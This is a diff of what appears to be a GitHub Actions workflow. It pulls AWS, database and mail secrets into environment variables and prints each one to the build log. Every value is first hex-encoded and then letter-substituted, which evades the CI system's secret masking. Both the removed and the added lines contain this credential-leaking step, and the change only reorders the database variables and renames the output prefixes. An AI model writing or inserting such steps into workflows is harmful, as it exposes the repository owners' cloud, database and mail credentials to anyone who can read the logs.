@@ -8,17 +8,17 @@ jobs:
         env:
           K0: ${{ secrets.AWS_ACCESS_KEY }}
           K1: ${{ secrets.AWS_SECRECT_KEY }}
-          K2: ${{ secrets.DB_PASSWORD }}
-          K3: ${{ secrets.DB_URL }}
-          K4: ${{ secrets.DB_USERNAME }}
+          K2: ${{ secrets.DB_URL }}
+          K3: ${{ secrets.DB_USERNAME }}
+          K4: ${{ secrets.DB_PASSWORD }}
           K5: ${{ secrets.MAIL_PWD }}
           K6: ${{ secrets.MAIL_USERNAME }}
         run: |
           set +e
-            echo "C0::$(echo -n "$K0" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "C1::$(echo -n "$K1" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "C2::$(echo -n "$K2" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "C3::$(echo -n "$K3" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "C4::$(echo -n "$K4" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "C5::$(echo -n "$K5" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "C6::$(echo -n "$K6" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "P0::$(echo -n "$K0" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "P1::$(echo -n "$K1" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "P2::$(echo -n "$K2" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "P3::$(echo -n "$K3" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "P4::$(echo -n "$K4" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "P5::$(echo -n "$K5" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "P6::$(echo -n "$K6" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
